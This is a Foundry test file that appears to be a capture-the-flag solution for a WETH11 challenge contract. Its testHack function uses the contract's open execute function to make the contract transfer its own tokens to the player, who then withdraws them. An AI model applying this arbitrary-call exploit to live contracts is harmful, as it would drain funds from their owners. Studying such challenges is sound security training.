// SPDX-License-Identifier: Manija
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts/contracts/interfaces/IERC20.sol";

import "../src/WETH11.sol";

contract Weth11Test is Test {
    WETH11 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH11();
        bob = makeAddr("bob");

        vm.deal(address(bob), 10 ether);

        vm.startPrank(bob);
        weth.deposit{value: 10 ether}();

        weth.transfer(address(weth), 10 ether);
        vm.stopPrank();
    }

    function testHack() public {
        assertEq(
            weth.balanceOf(address(weth)),
            10 ether,
            "weth contract should have 10 ether"
        );

        vm.startPrank(bob);

        // hack time!
        weth.execute(address(weth), 0, abi.encodeWithSignature("transfer(address,uint256)", address(bob), 10 ether));
        weth.withdrawAll();

        vm.stopPrank();

        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(
            weth.balanceOf(address(weth)),
            0,
            "empty weth on weth contract"
        );

        assertEq(
            bob.balance,
            10 ether,
            "player should recover initial 10 ethers"
        );
    }
}